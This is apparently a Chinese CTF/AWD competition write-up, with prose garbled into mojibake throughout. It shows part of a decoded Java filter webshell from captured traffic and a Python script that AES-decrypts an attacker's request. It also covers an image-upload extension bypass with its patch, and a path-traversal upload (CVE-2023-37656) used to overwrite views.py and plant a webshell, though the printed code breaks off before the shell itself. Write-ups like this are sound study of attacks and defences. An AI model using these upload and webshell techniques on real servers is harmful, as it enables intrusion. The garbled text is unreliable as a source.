class="string">&quot;getDecoder&quot;</span>).invoke((Object)<span class="keyword">null</span>);</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">byte</span>[])((<span class="keyword">byte</span>[])((<span class="keyword">byte</span>[])decoder.getClass().getMethod(<span class="string">&quot;decode&quot;</span>, String.class).invoke(decoder, str)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>å¤§è‡´å°±æ˜¯base64è§£ç ï¼Œç„¶åaesè§£ç ï¼Œå¯†é’¥ç»™äº†ï¼Œç„¶åæ²¡æŒ‡å®šåŠ å¯†æ¨¡å¼ï¼Œå°±ç”¨ecbè§£</p>
<p>ä¸‹æ¡æµé‡åªæœ‰request bodyäº†ï¼Œè§£å¯†è„šæœ¬å¦‚ä¸‹ï¼š<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">cipher_text = <span class="string">&quot;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&quot;</span></span><br><span class="line">cipher_text = base64.b64decode(cipher_text)</span><br><span class="line">key = <span class="string">b&#x27;eac9fa38330a7535&#x27;</span></span><br><span class="line"></span><br><span class="line">aes = AES.new(key, <span class="number">1</span>)</span><br><span class="line">shell = aes.decrypt(cipher_text)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;test.ser&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(shell)</span><br></pre></td></tr></table></figure></p>
<p>ç„¶åè§£å‡ºæ¥åºåˆ—åŒ–æ–‡ä»¶test.serå¦‚ä¸‹å†…å®¹ï¼š</p>
<p><img src="https://s2.loli.net/2023/09/16/N5wrDPlROUVAt6n.png" alt=""></p>
<h2 id="å®æ™¯é˜²å¾¡"><a href="#å®æ™¯é˜²å¾¡" class="headerlink" title="å®æ™¯é˜²å¾¡"></a>å®æ™¯é˜²å¾¡</h2><p>idaå¯¹æœ¬æ¬¡æ‰€æœ‰binaryç¨‹åºçš„åˆ†æå’Œæ”¯æŒéƒ½æ˜¯ä¸€å¨ğŸ’©ï¼Œä½†æ˜¯ghidraçš„patchåŠŸèƒ½ä¹Ÿæ˜¯ä¸€å¨ğŸ’©ï¼Œæ‰€ä»¥patchåŠŸèƒ½åŸºæœ¬é‡‡å–ghidraåˆ†æ+idaå­—ç¬¦ä¸²å®šå‘+ida patchçš„æ¨¡å¼æ¥ä¿®å¤ã€‚</p>
<h3 id="MINIGAMEã€SafeNoteã€staticFix"><a href="#MINIGAMEã€SafeNoteã€staticFix" class="headerlink" title="MINIGAMEã€SafeNoteã€staticFix"></a>MINIGAMEã€SafeNoteã€staticFix</h3><p>é€šé˜²ä¸€æŠŠğŸ”äº†ï¼Œseccompç›´æ¥æŠŠexecveç»™ğŸ‘äº†å°±å½³äº</p>
<h3 id="ImageHost"><a href="#ImageHost" class="headerlink" title="ImageHost"></a>ImageHost</h3><p>ä¸€ä¸ªå›¾ç‰‡ä¸Šä¼ æœåŠ¡ï¼Œåç«¯æ˜¯cgiï¼Œæ¼æ´ç‚¹ä½äºcheckæ–‡ä»¶æ‰©å±•åçš„ä½ç½®å¤„ï¼š</p>
<p><img src="https://s2.loli.net/2023/09/16/g8ZfqVX4waMJOk7.png" alt=""></p>
<p>å…¶ä¸­æ£€æµ‹file typeçš„é€»è¾‘å¦‚ä¸‹ï¼š<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">undefined8 <span class="title">FUN_001013c9</span><span class="params">(<span class="keyword">char</span> *param_1)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *pcVar1;</span><br><span class="line">  undefined8 uVar2;</span><br><span class="line">  </span><br><span class="line">  pcVar1 = <span class="built_in">strchr</span>(param_1,<span class="string">L&#x27;.&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> ((pcVar1 == (<span class="keyword">char</span> *)<span class="number">0x0</span>) ||</span><br><span class="line">     (((((*pcVar1 != <span class="string">&#x27;.&#x27;</span> || (pcVar1[<span class="number">1</span>] != <span class="string">&#x27;j&#x27;</span>)) || (pcVar1[<span class="number">2</span>] != <span class="string">&#x27;p&#x27;</span>)) || (pcVar1[<span class="number">3</span>] != <span class="string">&#x27;g&#x27;</span>)) &amp;&amp;</span><br><span class="line">      (((*pcVar1 != <span class="string">&#x27;.&#x27;</span> || (pcVar1[<span class="number">1</span>] != <span class="string">&#x27;p&#x27;</span>)) || ((pcVar1[<span class="number">2</span>] != <span class="string">&#x27;n&#x27;</span> || (pcVar1[<span class="number">3</span>] != <span class="string">&#x27;g&#x27;</span>)))))))) &#123;</span><br><span class="line">    uVar2 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    uVar2 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> uVar2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<p>å¯ä»¥å‘ç°æå–åç¼€åä½¿ç”¨çš„æ˜¯strchrå‡½æ•°ï¼Œä»å·¦åˆ°å³åŒ¹é…ç¬¬ä¸€ä¸ªç‚¹å·ï¼Œæ­¤æ—¶å¦‚æœç”¨test.png.txtä¾¿å¯ä»¥ç»•è¿‡è¿™ä¸ªæ–‡ä»¶æ£€æµ‹çš„é€»è¾‘</p>
<p>æ£€æµ‹é€šè¿‡åï¼Œcgiç¨‹åºä¼šå°†ç”Ÿæˆçš„ä¸´æ—¶æ–‡ä»¶è·¯å¾„è¿”å›åˆ°å‰ç«¯ï¼Œå‰ç«¯æ¥è¯»å–æ–‡ä»¶å†…å®¹</p>
<p>patchæ€è·¯å°±æ˜¯æŠŠstrchræ”¹ä¸ºstrrchrï¼Œå¸Œæœ›ç¨‹åºèƒ½å¤Ÿä»å³å‘å·¦æ¥åŒ¹é…ç‚¹å·ï¼Œè·å–åˆ°æœ€åä¸€ä¸ªåç¼€ï¼Œè™½ç„¶å¼€äº†pieï¼Œä½†æ˜¯åªè¦æŸ¥ç¬¦å·è¡¨çš„ç›¸å¯¹åç§»ä¾¿èƒ½è·å–åˆ°strrchrçš„gotåœ°å€</p>
<h3 id="guide"><a href="#guide" class="headerlink" title="guide"></a>guide</h3><p>æ˜¯ä¸ª1dayï¼Œæ¯”èµ›çš„æ—¶å€™ğŸ‘´ğŸ»ğŸšªæ‰¾å‡ºæ¥æ¼æ´äº†ï¼Œä½†æ˜¯æ²¡patchæˆåŠŸï¼Œå› ä¸ºé¡¹ç›®ä»£ç é‡å¤ªå¤§ï¼Œæ‰€ä»¥èµ›åå¤ç°ä¸€æ³¢ã€‚</p>
<p>CVE-2023-37656ï¼š<a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2023-37656">https://nvd.nist.gov/vuln/detail/CVE-2023-37656</a></p>
<p>æ•´ä½“ç«™ç‚¹æ˜¯ä¸ªwebç½‘å€ç®¡ç†çš„ä¸œè¥¿ï¼Œä½†æ˜¯åˆ†æäº†ä¸€æ³¢ä»–çš„djangoçš„è·¯ç”±ä¹‹åï¼Œå‘ç°Iconå¤„ç†çš„é€»è¾‘æœ‰é—®é¢˜ï¼š</p>
<p>åœ¨postæ¥å£ä¸­å®ç°äº†æ–‡ä»¶ä¸Šä¼ ï¼Œä½†æ˜¯æ²¡æœ‰å¯¹è·¯å¾„å’Œæ–‡ä»¶åšä»»ä½•æ ¡éªŒï¼Œä»£ç è·¯å¾„ä¸º<code>websiteapp/views.py</code>ï¼š</p>
<p><img src="https://s2.loli.net/2023/09/17/6FUYtLVuWi9Ns2I.png" alt=""></p>
<p>è·¯ç”±è°ƒç”¨é“¾ä¸ºï¼š</p>
<p>å‰ç«¯è§¦å‘ï¼š<code>websitefronted/src/components/Admin/Website/index.vue -&gt; websitefronted/src/components/Admin/Website/module/editIcon.vue</code></p>
<p>è·¯ç”±ï¼š<code>/api/icon/</code></p>
<p>é¦–å…ˆå¯ä»¥ä»»æ„è·¯å¾„ä¸Šä¼ æ–‡ä»¶ï¼š</p>
<p><img src="https://s2.loli.net/2023/09/17/jMzqnduxr4NQBlP.png" alt=""></p>
<p>å¯ä»¥ç©¿è¶Šiconè·¯å¾„å®ç°ç›®å½•ç©¿è¶Šï¼š</p>
<p><img src="https://s2.loli.net/2023/09/17/ePAnHKumaLNdJyg.png" alt=""></p>
<p>è¿˜æœ‰æ²¡æœ‰æ£€æŸ¥æ–‡ä»¶å†…å®¹ï¼Œå¯ä»¥ä¼ ä¸€ä¸ªviews.pyï¼Œå®ç°å¯¹IconViewSetç±»çš„getæ–¹æ³•è¦†ç›–ï¼Œå¹¶æ¤å…¥webshellï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create your views here.</span></span><br><span class="line"><span class="keyword">from</span> WebsiteGuide.basic <span class="keyword">import</span> CustomResponse, CustomPagination</span><br><span class="line"><span class="keyword">from</span> websiteapp <span class="keyword">import</span> models</span><br><span class="line"><span class="keyword">from</span> websiteapp.serializers.websites_serializer <span class="keyword">import</span> \</span><br><span class="line">    AllWebsiteDataSerializers, UpdateWebsiteDataSerializers, GetWebsiteDataSerializers</span><br><span class="line"><span class="keyword">from</span> websiteapp.serializers.group_serializer <span class="keyword">import</span> WebsiteGroupSerializers</span><br><span class="line"><span class="keyword">from</span> websiteapp.serializers.user_serializer <span class="keyword">import</span> UserInfoSerializer</span><br><span class="line"><span class="keyword">from</span> rest_framework <span class="keyword">import</span> status</span><br><span class="line"><span class="keyword">from</span> rest_framework.views <span class="keyword">import</span> APIView</span><br><span class="line"><span class="keyword">from</span> rest_framework.viewsets <span class="keyword">import</span> ModelViewSet, ReadOnlyModelViewSet</span><br><span class="line"><span class="keyword">from</span> rest_framework.filters <span class="keyword">import</span> SearchFilter</span><br><span class="line"><span class="keyword">from</span> rest_framework.decorators <span class="keyword">import</span> action</span><br><span class="line"><span class="keyword">from</span> django.contrib.auth <span class="keyword">import</span> authenticate</span><br><span class="line"><span class="keyword">from</span> rest_framework.permissions <span class="keyword">import</span> IsAuthenticated</span><br><span class="line"><span class="keyword">from</span> rest_framework_jwt.settings <span class="keyword">import</span> api_settings</span><br><span class="line"><span class="keyword">from</span> rest_framework_jwt.authentication <span class="keyword">import</span> JSONWebTokenAuthentication</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> django.conf <span class="keyword">import</span> settings</span><br><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse, JsonResponse</span><br><span class="line"><span class="keyword">from</span> django.views <span class="keyword">import</span> View</span><br><span class="line"></span><br><span class="line">jwt_payload_handler = api_settings.JWT_PAYLOAD_HANDLER</span><br><span class="line">jwt_encode_handler = api_settings.JWT_ENCODE_HANDLER</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserAuthView</span>(<span class="params">APIView</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    ç”¨æˆ·è®¤è¯è·å–token</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span>(<span class="params">self, request, *args, **kwargs</span>):</span></span><br><span class="line">        username = request.data.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        password = request.data.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">        user = authenticate(username=username, password=password)</span><br><span class="line">        <span 